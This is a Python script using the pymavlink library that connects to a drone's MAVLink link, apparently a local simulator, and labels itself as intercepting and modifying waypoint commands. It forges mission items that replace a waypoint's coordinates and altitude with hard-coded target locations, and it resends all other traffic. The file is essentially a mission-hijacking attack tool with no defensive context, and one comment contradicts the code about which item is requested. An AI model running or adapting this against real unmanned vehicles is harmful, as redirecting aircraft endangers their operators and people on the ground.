import time
from pymavlink import mavutil, dialects
import pymavlink.dialects.v20.all as dialect

# Define some target locations
TARGET_LOCATIONS = [
    {
        "latitude": -35.36130812,
        "longitude": 149.16114736,
        "altitude": 30
    },
    {
        "latitude": -35.36579988,
        "longitude": 149.16302080,
        "altitude": 40
    }
]

# Connect to the vehicle
vehicle = mavutil.mavlink_connection(device="udpin:127.0.0.1:14550")

# Wait for a heartbeat
vehicle.wait_heartbeat()
print("Connected to system:", vehicle.target_system, ", component:", vehicle.target_component)

# Request specific mission item
def request_mission_item(seq):
    vehicle.mav.mission_request_int_send(vehicle.target_system, vehicle.target_component, seq)
    print(f"Requested mission item {seq}")

# Intercept and modify MAVLink waypoint commands
def intercept_and_modify_command():
    request_mission_item(2)  # Requesting mission item with sequence 4

    while True:
        msg = vehicle.recv_match(blocking=True)
        if msg:
            msg_type = msg.get_type()

            if msg_type == 'MISSION_ITEM_INT':
                print("Intercepted mission item:", msg)
                modified_msg = dialect.MAVLink_mission_item_int_message(
                    msg.target_system,
                    msg.target_component,
                    msg.seq,
                    msg.frame,
                    mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
                    msg.current,
                    0,
                    msg.param1,
                    msg.param2,
                    msg.param3,
                    msg.param4,
                    int(TARGET_LOCATIONS[0]["latitude"] * 1e7),  # New latitude
                    int(TARGET_LOCATIONS[0]["longitude"] * 1e7),  # New longitude
                    TARGET_LOCATIONS[0]["altitude"]  # New altitude
                )
                # Send the modified message
                vehicle.mav.send(modified_msg)
                print(modified_msg)
                print("Sent modified waypoint command with new location")
            else:
                vehicle.mav.send(msg)

# Main function
def main():
    intercept_and_modify_command()

# Run the main function
if __name__ == "__main__":
    main()
